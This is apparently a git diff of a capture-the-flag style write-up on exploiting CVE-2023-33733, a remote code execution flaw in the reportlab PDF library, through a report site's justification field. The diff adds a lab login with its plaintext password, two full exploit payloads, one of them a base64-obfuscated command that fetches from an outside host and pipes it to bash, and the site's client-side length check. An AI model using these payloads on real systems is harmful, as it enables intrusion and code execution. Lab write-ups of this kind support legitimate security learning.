@@ -129,7 +129,7 @@ ClaudiaS	dadsfawe9dafkn
 
 All credentials are not incorrect. But the format of username is "FirstL".
 
-Regconize Blake.byte is invalid, change it to BlakeB pass `ThisCanB3typedeasily1@`and successfully login to the report website.
+Regconize Blake.byte is invalid, change it to `BlakeB` with password `ThisCanB3typedeasily1@`and successfully login to the report website.
 
 ![alt text](image-1.png)
 
@@ -147,9 +147,13 @@ All the subpage are same. Let check the button `Generate PDF`
 
 It generate a PDF file. It insert my uploaded image to the PDF file.
 
-Search on Google: reporthub exploit and got this repo: https://github.com/c53elyas/CVE-2023-33733
+![alt text](image-8.png)
 
-the payload
+Found the `reportlab` here.
+
+Search on Google: reportlab exploit and got this repo: https://github.com/c53elyas/CVE-2023-33733
+
+The payload
 ```html
 <para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                 exploit
@@ -160,3 +164,93 @@ See the color attribute -> edit the Justification to add the html tag.
 
 ![alt text](image-7.png)
 
+Find another poc of CVE-2023-33733
+
+https://github.com/Sudistark/BB-Writeups/blob/main/2023/CVE-2023-33733-rce-via-htmli-in-reportlab.md
+
+```html
+<font color="[ [ [ [ ftype(ctype(0, 0, 0, 0, 3, 67, b't\\x00d\\x01\\x83\\x01\\xa0\\x01d\\x02\\xa1\\x01\\x01\\x00d\\x00S\\x00', (None, 'os', 'echo Y3VybCBodHRwOi8vMTAuMTAuMTQuMzI6ODAwMAo= | base64 -d|bash'), ('__import__', 'system'), (), '<stdin>', '', 1, b'\\x12\\x01'), {})() for ftype in [type(lambda: None)] ] for ctype in [type(getattr(lambda: {None}, Word('__code__')))] ] for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">exploit</font>
+```
+
+Still failed.
+
+https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC
+
+Still failed.
+
+
+The actual payload is look like this:
+
+```html
+<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
+                exploit
+</font></para>
+```
+
+Just edit the justification didn't work.
+Checking how this website generate the html file.
+
+When send the payload, I get the warning like this:
+![alt text](image-9.png)
+
+
+Need to shorten the payload??? maximum 300 characters
+
+Read Javascript to know how it validate the input
+```javascript
+const editor = document.getElementById('editor');
+const userTextInput = document.getElementById('user_input');
+const charCountDisplay = document.getElementById('charCount');
+const maxCharacters = 300;
+
+const toolbarOptions = [
+    ['bold', 'italic', 'underline', 'strike'],
+    ['blockquote', 'code-block'],
+    [{ 'header': 1 }, { 'header': 2 }],
+    [{ 'list': 'ordered' }, { 'list': 'bullet' }],
+    [{ 'indent': '-1' }, { 'indent': '+1' }],
+    [{ 'align': [] }],
+    ['clean']
+];
+
+
+var quill = new Quill('#editor', {
+    theme: 'snow',
+    modules: {
+        toolbar: toolbarOptions,
+    },
+});
+
+
+quill.on('text-change', function () {
+    let quillContent = quill.root.innerHTML;
+    quillContent = quillContent.replace(/<\/?[^>]+(>|$)/g, ""); // Remove HTML tags
+    const charCount = quillContent.length;
+
+    charCountDisplay.textContent = charCount + '/' + maxCharacters + ' characters';
+
+    if (charCount > maxCharacters) {
+        quill.deleteText(maxCharacters, charCount - maxCharacters);
+    }
+
+    // Update the hidden textarea directly
+    userTextInput.value = quillContent;
+});
+
+document.addEventListener('DOMContentLoaded', function () {
+    const form = document.querySelector('form');
+
+    form.addEventListener('submit', function (event) {
+    var fromDate = $("#from").val();
+    var toDate = $("#to").val();
+    var dateRange = fromDate + " to " + toDate;
+    document.getElementById('time_interval').value = dateRange;
+    
+        userTextInput.value = quill.root.innerHTML;
+    });
+});
+
+$( function() {
+    $( "#from, #to" ).datepicker({ dateFormat: 'yy-mm-dd' });
+} );
+```
